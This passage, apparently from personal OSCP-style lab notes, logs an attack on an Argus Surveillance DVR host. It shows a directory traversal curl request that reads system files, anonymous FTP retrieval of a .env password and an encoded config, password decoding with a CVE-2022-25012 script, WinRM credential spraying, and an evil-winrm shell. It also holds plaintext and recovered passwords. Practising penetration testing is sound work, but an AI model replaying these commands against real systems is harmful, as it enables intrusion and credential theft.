Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -995d10h10m18s
| smb2-time: 
|   date: 2023-03-29T14:12:06
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11471/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30665/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23637/udp): CLEAN (Failed to receive data)
|   Check 4 (port 42252/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   165.41 ms 192.168.49.1
2   165.91 ms 192.168.55.111

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.01s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1234.08 seconds
           Raw packets sent: 79046 (3.479MB) | Rcvd: 69710 (2.790MB)
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# curl "http://192.168.55.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# curl "http://192.168.55.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2FDrivers%2Fetc%2Fhosts&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# lftp -u anonymous, 192.168.55.111                                                                                     
lftp anonymous@192.168.55.111:~> ls
02-23-22  08:13AM                  145 .env
02-23-22  08:13AM                 2056 Acq.dll
02-24-22  06:24AM                 4868 DVRParams.ini
02-23-22  08:13AM                35996 Manifest.dll
02-23-22  08:13AM                20455 program.exe
02-23-22  08:15AM                40229 verisign.png
02-23-22  08:14AM                11446 wab.dll
lftp anonymous@192.168.55.111:/> get .env
145 bytes transferred in 1 second (114 B/s)   
lftp anonymous@192.168.55.111:/> 
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# ll                                                                                                                    
total 28
-rw-r--r-- 1 root root 26931 Dec 18 21:22 host.scan
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# ls -la
total 40
drwxr-xr-x 2 root root  4096 Dec 19 03:18 .
drwxr-xr-x 5 root root  4096 Dec 18 20:56 ..
-rw-r--r-- 1 root root   145 Feb 23  2022 .env
-rw-r--r-- 1 root root 26931 Dec 18 21:22 host.scan
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# cat .env         
STATUS = development
DEV_PORT = 7500
PROD_PORT = 7600
HOST = localhost
DATABASE = db.dev
USER = Sandra
PASSWORD = Nj82@1Waqk90$
DIALECT = MSSQL 
```
```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# lftp -u anonymous, 192.168.55.111
lftp anonymous@192.168.55.111:~> ls
02-23-22  08:13AM                  145 .env
02-23-22  08:13AM                 2056 Acq.dll
02-24-22  06:24AM                 4868 DVRParams.ini
02-23-22  08:13AM                35996 Manifest.dll
02-23-22  08:13AM                20455 program.exe
02-23-22  08:15AM                40229 verisign.png
02-23-22  08:14AM                11446 wab.dll
lftp anonymous@192.168.55.111:/> get DVRParams.ini
4868 bytes transferred in 1 second (3.9 KiB/s)         
lftp anonymous@192.168.55.111:/> 
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# cat DVRParams.ini 
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DialUpUseDefaults=1
DialUpUserName=
DialUpPassword=
DialUpDomain=
DialUpPhone=
ConnectCameraAtStartup=1
ConnectSessionFile=Argus Surveillance DVR.DVRSes
StartAsService=0
RunPreviewAtStartup=1
FullScreenAtStartup=0
GalleryFolder=C:\ProgramData\PY_Software\Argus Surveillance DVR\Gallery\
RecordEncryptionPassword=
RecordFrameInterval=200
RecordMaxFileSize=0
RecordEncryption=0
RecordAllTime=0
RecordSound=1
RecordMotion=1
RecordCamName=1
RecordCamLocation=1
RecordCamDescript=1
HTTP_AlwaysActive=1
HTTP_Port=8080
HTTP_Interval=100
HTTP_LimitViewers=0
HTTP_NeedAuthorization=0
HTTP_NeedLocalAuthorization=0
HTTP_MaxNumberOfViewers=100
HTTP_AudioEnabled=1
HTTP_StreamEnabled=1
HTTP_EncriptionType=0
HTTP_VideoBitRate=204800
HTTP_DisconnectInactiveUsers=0
HTTP_MaxInactivityTime=0
HTTP_MaxConnectionMinutes=0
HTTP_ReconnectAgain=0
WriteHTTPLog=1
WriteMotionLog=1
WriteEventsLog=1
LimitMaxSizeOfLogFile=1
MaxSizeOfLogFile=10000
UseRedirect=1
UseWebMonitoring=0
PYSoftAccountEmail=
PYSoftAccountPsw=
AskLoginAtStartup=0
TaskTrayPassword=
StealthMode=0
AskForConfirmationOnExit=0
Watchdog_PollingIntrvl=20
Watchdog_RestartProgramPolls=20
Watchdog_Reboot=0
Watchdog_RebootTries=20
Watchdog_RebootPeriodically=1
Watchdog_RebootPeriodclType=1
Watchdog_RebootInterval=1
Watchdog_Hours=24
Watchdog_Days=1
Watchdog_DayOfWeek=0
Watchdog_Month=1
Watchdog_RebootIfCPU=0
Watchdog_RebootIfCPUType=0
Watchdog_CPU=98
Watchdog_RebootIfCPUPolls=20
Watchdog_IsRemoteAccess=0
Watchdog_AccessPort=10000
Watchdog_AccessID=
Watchdog_AccessPsw=
DynIPNextConnectTime0=0
DynIPNextConnectTime1=0
MonitorNextConnectTime0=0
MonitorNextConnectTime1=0
SMSNextConnectTime0=0
SMSNextConnectTime1=0
UseScreenSaver=0
ScreenSaveTimeOut=5
MaxFileSize=2048
StreamToWeb=0
WebPageBackColor=16767949
WebPageTextColor=0
WebPageLinkColor=0
WebPageActiveLnkColor=0
WebPageVisitedLnkColor=0
WebPageActiveXColor=0
PreviewByOCX=1
ReduceCPUUsage=1
MaximumCPUUsage=95
ActionsAllTime=0
DetectMotion=0
DetectionInterval=500
MotionDetectionDelay=1000
DifferencesThreshold=5
MotionDifSensitivity=0
MotionDontTriggerIfMuch=0
MotionDontTriggerTrshld=90
MotionSensitivityCnst=90
MotionSensitivity1=30
MotionSensitivity2=21
MotionSensitivity3=17
MotionSensitivity4=15
MotionSensitivity5=15
MotionSensitivity6=17
MotionSensitivity7=21
MotionSensitivity8=30
MotionMinActionDuration=2000
MotionSendEmail=0
EmailUsePysoftMailServer=0
MotionEmailServer=
MotionEmailNeedPassword=0
MotionEmailAccountName=
MotionEmailPassword=
MotionEmailSMTPPort=25
MotionEmailSender=
MotionEmailAddress=
MotionEmailSubject=4D6F74696F6E207B4D4F54494F4E7D2520686173206265656E206465746563746564212121
MotionEmailMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D6F74696F6E20696E20746865207761746368656420617265612E
MotionEmailInterval=20
MotionEmailAttachImage=1
MotionEmailNumberOfImages=3
MotionEmailPriority=1
FacesDetect=0
FacesHighlight=1
FaceDetectSensitivityInPercents=50
FaceDetecMinFaceInPercents=10
MotionPlaySound=0
MotionSoundFile=
MotionLanchApplication=0
MotionApplicationFile=
MotionRecordVideo=0
MotionVideoDuration=120
MotionPreVideoDuration=2
MotionWriteSnapshots=0
MotionSnapshotDuration=10
MotionChangeSettings=0
MotionImageQuality=70
MotionSoundQuality=70
MotionRecordInterval=133
MotionChangeSettingsDuration=10
MotionDrawMotionValue=0
MotionHighlightMoving=0
SendSMS=0
SMSSender=
SMSPhone=
SMSMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D6F74696F6E20696E20746865207761746368656420617265612E
RemoveObsoleteFiles=1
DaysToDeleteObsoleteFiles=7

[Users]
LocalUsersCount=1
UserID0=3206624
LoginName0=Admin
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
FullControl0=1
CanClose0=1
CanPlayback0=1
CanPTZ0=1
CanRecord0=1
CanConnect0=1
CanReceiveAlerts0=1
CanViewLogs0=1
CanViewCamerasNumber0=0
CannotBeRemoved0=1
MaxConnectionTimeInMins0=0
DailyTimeLimitInMins0=0
MonthlyTimeLimitInMins0=0
DailyTrafficLimitInKB0=0
MonthlyTrafficLimitInKB0=0
MaxStreams0=0
MaxViewers0=0
MaximumBitrateInKb0=0
AccessFromIPsOnly0=
AccessRestrictedForIPs0=
MaxBytesSent0=0
Password0=6FE0F539CA79E03BECB4D9BDF6413F7EC48C4AC3956BCA79ECB4EB60906BB4A1E1B0F539EB60E03BAAFECA79B734B398
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
Disabled0=0
ExpirationDate0=0
Organization0=
OrganizationUnit0=
Phone10=
Phone20=
Fax0=
Email0=
Position0=
Address10=
Address20=
City0=
StateProvince0=
ZipPostalCode0=
Country0=
ComputerID0=
TrialAccount0=0
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# git clone git@github.com:s3l33/CVE-2022-25012.git
Cloning into 'CVE-2022-25012'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 13 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (13/13), 5.54 KiB | 333.00 KiB/s, done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# ll
total 48
drwxr-xr-x 3 root root  4096 Dec 19 04:01 CVE-2022-25012
-rw-r--r-- 1 root root  4868 Feb 24  2022 DVRParams.ini
-rw-r--r-- 1 root root 26931 Dec 18 21:22 host.scan
-rw-r--r-- 1 root root    14 Dec 19 03:26 passwords.txt
-rw-r--r-- 1 root root    14 Dec 19 03:26 users.txt
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# cd CVE-2022-25012          
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/machines/StandAlone/machine-2/CVE-2022-25012]
└─# ll
total 12
-rw-r--r-- 1 root root 3390 Dec 19 04:01 CVE-2022-25012.py
-rw-r--r-- 1 root root 1062 Dec 19 04:01 LICENSE
-rw-r--r-- 1 root root 1480 Dec 19 04:01 README.md
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/machines/StandAlone/machine-2/CVE-2022-25012]
└─# chmod +x CVE-2022-25012.py 
                                                                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/machines/StandAlone/machine-2/CVE-2022-25012]
└─# python3 CVE-2022-25012.py 6FE0F539CA79E03BECB4D9BDF6413F7EC48C4AC3956BCA79ECB4EB60906BB4A1E1B0F539EB60E03BAAFECA79B734B398
/home/kali/OffSec/OSCP/Exam-2/machines/StandAlone/machine-2/CVE-2022-25012/CVE-2022-25012.py:48: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
#                                       #
# Updated by S3L33                      #
#########################################


[+] 6FE0:V
[+] F539:3
[+] CA79:r
[+] E03B:t
[+] ECB4:1
[+] D9BD:c
[+] F641:a
[+] 3F7E:l
[+] C48C:8
[+] 4AC3:S
[+] 956B:h
[+] CA79:r
[+] ECB4:1
[+] EB60:n
[+] 906B:k
[+] B4A1:2
[+] E1B0:C
[+] F539:3
[+] EB60:n
[+] E03B:t
[+] AAFE:u
[+] CA79:r
[+] B734:y
[+] B398:!

[+] Password: V3rt1cal8Shr1nk2C3ntury!
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# nxc winrm 192.168.55.111 -u users.txt -p passwords.txt   
WINRM       192.168.55.111  5985   OSCP             [*] Windows 10 / Server 2019 Build 19041 (name:OSCP) (domain:OSCP)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.55.111  5985   OSCP             [-] OSCP\sandra:Nj82@1Waqk90$
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.55.111  5985   OSCP             [-] OSCP\Sandra:Nj82@1Waqk90$
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.55.111  5985   OSCP             [-] OSCP\Admin:Nj82@1Waqk90$
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.55.111  5985   OSCP             [-] OSCP\admin:Nj82@1Waqk90$
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.55.111  5985   OSCP             [-] OSCP\Administrator:Nj82@1Waqk90$
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.55.111  5985   OSCP             [+] OSCP\sandra:V3rt1cal8Shr1nk2C3ntury! (Pwn3d!)
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-2]
└─# evil-winrm -i 192.168.55.111 -u 'sandra' -p 'V3rt1cal8Shr1nk2C3ntury!' -P 5985       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sandra\Documents> dir


    Directory: C:\Users\Sandra\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/23/2022   7:13 AM            145 .env
-a----         2/23/2022   7:13 AM           2056 Acq.dll
-a----         2/24/2022   5:24 AM           4868 DVRParams.ini
-a----         2/23/2022   7:13 AM          35996 Manifest.dll
-a----         2/23/2022   7:13 AM          20455 program.exe
-a----         2/23/2022   7:15 AM          40229 verisign.png
-a----         2/23/2022   7:14 AM          11446 wab.dll


*Evil-WinRM* PS C:\Users\Sandra\Documents> cd ..
*Evil-WinRM* PS C:\Users\Sandra> cd Desktop
*Evil-WinRM* PS C:\Users\Sandra\Desktop> dir


    Directory: C:\Users\Sandra\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/18/2025  10:21 AM             34 local.txt


*Evil-WinRM* PS C:\Users\Sandra\Desktop> type local.txt
ea393685fb5258bd14b1b4142a201194
*Evil-WinRM* PS C:\Users\Sandra\Desktop>
```

```bash
*Evil-WinRM* PS C:\ProgramData\PY_Software\Argus Surveillance DVR> type DVRParams.ini
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DialUpUseDefaults=1
DialUpUserName=
DialUpPassword=
DialUpDomain=
DialUpPhone=
ConnectCameraAtStartup=1
ConnectSessionFile=Argus Surveillance DVR.DVRSes
StartAsService=1
RunPreviewAtStartup=1
FullScreenAtStartup=0
GalleryFolder=C:\ProgramData\PY_Software\Argus Surveillance DVR\Gallery\
RecordEncryptionPassword=
RecordFrameInterval=200
RecordMaxFileSize=0
RecordEncryption=0
RecordAllTime=0
RecordSound=1
RecordMotion=1
RecordCamName=1
RecordCamLocation=1
RecordCamDescript=1
HTTP_AlwaysActive=1
HTTP_Port=8080
HTTP_Interval=100
HTTP_LimitViewers=0
HTTP_NeedAuthorization=0
HTTP_NeedLocalAuthorization=0
HTTP_MaxNumberOfViewers=100
HTTP_AudioEnabled=1
HTTP_StreamEnabled=1
HTTP_EncriptionType=0
HTTP_VideoBitRate=204800
HTTP_DisconnectInactiveUsers=0
HTTP_MaxInactivityTime=0
HTTP_MaxConnectionMinutes=0
HTTP_ReconnectAgain=0
WriteHTTPLog=1
WriteMotionLog=1
WriteEventsLog=1
LimitMaxSizeOfLogFile=1
MaxSizeOfLogFile=10000
UseRedirect=1
UseWebMonitoring=0
PYSoftAccountEmail=
PYSoftAccountPsw=
AskLoginAtStartup=0
TaskTrayPassword=
StealthMode=0
AskForConfirmationOnExit=0
Watchdog_PollingIntrvl=20
Watchdog_RestartProgramPolls=20
Watchdog_Reboot=0
Watchdog_RebootTries=20
Watchdog_RebootPeriodically=1
Watchdog_RebootPeriodclType=1
Watchdog_RebootInterval=1
Watchdog_Hours=24
Watchdog_Days=1
Watchdog_DayOfWeek=0
Watchdog_Month=1
Watchdog_RebootIfCPU=0
Watchdog_RebootIfCPUType=0
Watchdog_CPU=98
Watchdog_RebootIfCPUPolls=20
Watchdog_IsRemoteAccess=0
Watchdog_AccessPort=10000
Watchdog_AccessID=
Watchdog_AccessPsw=
DynIPNextConnectTime0=0
DynIPNextConnectTime1=0
MonitorNextConnectTime0=0
MonitorNextConnectTime1=0
SMSNextConnectTime0=0
SMSNextConnectTime1=0
UseScreenSaver=0
ScreenSaveTimeOut=5
MaxFileSize=2048
StreamToWeb=0
WebPageBackColor=16767949
WebPageTextColor=0
WebPageLinkColor=0
WebPageActiveLnkColor=0
WebPageVisitedLnkColor=0
WebPageActiveXColor=0
PreviewByOCX=1
ReduceCPUUsage=1
MaximumCPUUsage=95
ActionsAllTime=0
DetectMotion=0
DetectionInterval=500
MotionDetectionDelay=1000
DifferencesThreshold=5
MotionDifSensitivity=0
MotionDontTriggerIfMuch=0
MotionDontTriggerTrshld=90
MotionSensitivityCnst=90
MotionSensitivity1=30
MotionSensitivity2=21
MotionSensitivity3=17
MotionSensitivity4=15
MotionSensitivity5=15
MotionSensitivity6=17
MotionSensitivity7=21
MotionSensitivity8=30
MotionMinActionDuration=2000
MotionSendEmail=0
EmailUsePysoftMailServer=0
MotionEmailServer=
MotionEmailNeedPassword=0
MotionEmailAccountName=
MotionEmailPassword=
MotionEmailSMTPPort=25
MotionEmailSender=
MotionEmailAddress=
MotionEmailSubject=4D6F74696F6E207B4D4F54494F4E7D2520686173206265656E206465746563746564212121
MotionEmailMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D6F74696F6E20696E20746865207761746368656420617265612E
MotionEmailInterval=20
MotionEmailAttachImage=1
MotionEmailNumberOfImages=3
MotionEmailPriority=1
FacesDetect=0
FacesHighlight=1
FaceDetectSensitivityInPercents=50
FaceDetecMinFaceInPercents=10
MotionPlaySound=0
MotionSoundFile=
MotionLanchApplication=0
MotionApplicationFile=
MotionRecordVideo=0
MotionVideoDuration=120
MotionPreVideoDuration=2
MotionWriteSnapshots=0
MotionSnapshotDuration=10
MotionChangeSettings=0
MotionImageQuality=70
MotionSoundQuality=70
MotionRecordInterval=133
MotionChangeSettingsDuration=10
MotionDrawMotionValue=0
MotionHighlightMoving=0
SendSMS=0
SMSSender=
SMSPhone=
SMSMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D6F74696F6E20696E20746865207761746368656420617265612E
RemoveObsoleteFiles=1
DaysToDeleteObsoleteFiles=7
LastReadNetCamsListDay=46010

[Users]
LocalUsersCount=1
UserID0=3206624
LoginName0=Administrator
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
FullControl0=1
CanClose0=1
CanPlayback0=1
CanPTZ0=1
CanRecord0=1
CanConnect0=1
CanReceiveAlerts0=1
CanViewLogs0=1
CanViewCamerasNumber0=0
CannotBeRemoved0=1
MaxConnectionTimeInMins0=0
DailyTimeLimitInMins0=0
MonthlyTimeLimitInMins0=0
DailyTrafficLimitInKB0=0
MonthlyTrafficLimitInKB0=0
MaxStreams0=0
MaxViewers0=0
MaximumBitrateInKb0=0
AccessFromIPsOnly0=
AccessRestrictedForIPs0=
MaxBytesSent0=0
Password0=F787B740CA79E03BC875D9BDF6413F7EC48C9083956BCA79C875EB60906BB4A1D9BDB740EB60E03BAAFECA79B734
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
Disabled0=0
ExpirationDate0=0
Organization0=
OrganizationUnit0=
Phone10=
Phone20=
Fax0=
Email0=
Position0=
Address10=
Address20=
City0=
StateProvince0=
ZipPostalCode0=
Country0=
ComputerID0=
TrialAccount0=0
```

```bash
┌──(root💀kali)-[/home/…/machines/StandAlone/machine-2/CVE-2022-25012]
└─# python3 CVE-2022-25012.py F787B740CA79E03BC875D9BDF6413F7EC48C9083956BCA79C875EB60906BB4A1D9BDB740EB60E03BAAFECA79B734
/home/kali/OffSec/OSCP/Exam-2/machines/StandAlone/machine-2/CVE-2022-25012/CVE-2022-25012.py:48: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
#                                       #
# Updated by S3L33                      #
#########################################


[+] F787:v
[+] B740:e
[+] CA79:r
[+] E03B:t
[+] C875:i
[+] D9BD:c
[+] F641:a
[+] 3F7E:l
[+] C48C:8
[+] 9083:s
[+] 956B:h
[+] CA79:r
[+] C875:i
[+] EB60:n
[+] 906B:k
[+] B4A1:2
[+] D9BD:c
[+] B740:e
[+] EB60:n
[+] E03B:t
[+] AAFE:u
[+] CA79:r
[+] B734:y

[+] Password: vertical8shrink2century
```



=============================================================
## Target 3:

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-3]
└─# nmap -A -vv -p- -T4 -Pn -oX host.scan 192.168.55.112  --webxml

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 21:02 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:02
Completed Parallel DNS resolution of 1 host. at 21:02, 0.02s elapsed
Initiating SYN Stealth Scan at 21:02
Scanning 192.168.55.112 [65535 ports]
Discovered open port 21/tcp on 192.168.55.112
Discovered open port 3389/tcp on 192.168.55.112
Discovered open port 80/tcp on 192.168.55.112
Discovered open port 8080/tcp on 192.168.55.112
Discovered open port 443/tcp on 192.168.55.112
SYN Stealth Scan Timing: About 3.86% done; ETC: 21:16 (0:12:52 remaining)
SYN Stealth Scan Timing: About 11.65% done; ETC: 21:11 (0:07:42 remaining)
SYN Stealth Scan Timing: About 18.41% done; ETC: 21:10 (0:06:43 remaining)
SYN Stealth Scan Timing: About 26.61% done; ETC: 21:10 (0:05:34 remaining)
SYN Stealth Scan Timing: About 36.47% done; ETC: 21:09 (0:04:23 remaining)
SYN Stealth Scan Timing: About 46.52% done; ETC: 21:09 (0:03:28 remaining)
SYN Stealth Scan Timing: About 59.28% done; ETC: 21:08 (0:02:25 remaining)
SYN Stealth Scan Timing: About 72.32% done; ETC: 21:08 (0:01:32 remaining)
SYN Stealth Scan Timing: About 85.70% done; ETC: 21:07 (0:00:45 remaining)
Completed SYN Stealth Scan at 21:07, 298.86s elapsed (65535 total ports)
Initiating Service scan at 21:07
Scanning 5 services on 192.168.55.112
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 21:07, 6.46s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 192.168.55.112
Retrying OS detection (try #2) against 192.168.55.112
Initiating Traceroute at 21:07
Completed Traceroute at 21:07, 0.18s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:07
Completed Parallel DNS resolution of 2 hosts. at 21:07, 0.02s elapsed
NSE: Script scanning 192.168.55.112.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:07
NSE: [ftp-bounce 192.168.55.112:21] PORT response: 501 Server cannot accept argument.
NSE Timing: About 99.86% done; ETC: 21:08 (0:00:00 remaining)
Completed NSE at 21:08, 31.74s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 3.14s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.01s elapsed
Nmap scan report for 192.168.55.112
Host is up, received user-set (0.16s latency).
Scanned at 2025-12-18 21:02:42 -03 for 345s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 4.12.17, nicepage.com
|_http-title: Home
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
443/tcp  open  http          syn-ack ttl 127 Apache httpd 2.4.51 (PHP/7.4.26)
|_http-generator: Nicepage 4.12.21, nicepage.com
| http-methods: 
